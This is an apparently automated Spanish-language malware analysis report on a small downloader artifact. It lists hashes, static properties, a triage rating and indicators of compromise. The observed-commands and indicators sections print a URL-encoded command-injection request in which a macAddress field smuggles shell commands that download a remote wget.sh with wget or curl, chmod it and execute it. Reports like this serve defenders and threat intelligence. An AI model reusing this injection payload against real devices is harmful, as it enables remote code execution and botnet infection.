# 🧬 Payload Analysis

`5b59fdb5f70dffbf085cf7618c7aeaf34751c0d30aebe4f1c251db02cd4ed55f`

## 📌 Resumen

Artefacto identificado como ASCII text, with very long lines (325), with CRLF line terminators de 374 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `5b59fdb5f70dffbf085cf7618c7aeaf34751c0d30aebe4f1c251db02cd4ed55f`
- **SHA1:** `64664894c03344825c01b0eba2f2ccca0c83e6c6`
- **MD5:** `fd6704f77f7b1b88d9912a34cb3af587`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (325), with CRLF line terminators |
| Tamaño | 374 B |
| Entropía | 5.05 |
| Strings | 3 |

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (325), with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
GET /None?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O%20.s%3Bcurl%20-o%20.s%20http://91.92.40.XXX/wget.sh%3Bchmod%20777%20.s%3Bsh%20.s%20rep.ngdgn%3Brm%20-f%20.s;%20echo%20 | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.169.XXX | static_analysis |
| command | GET /None?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;cd%20/tmp%3Brm%20-f%20.s%3Bwget%20http://91.92 | strings |
| hash | 5b59fdb5f70dffbf085cf7618c7aeaf34751c0d30aebe4f1c251db02cd4ed55f | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
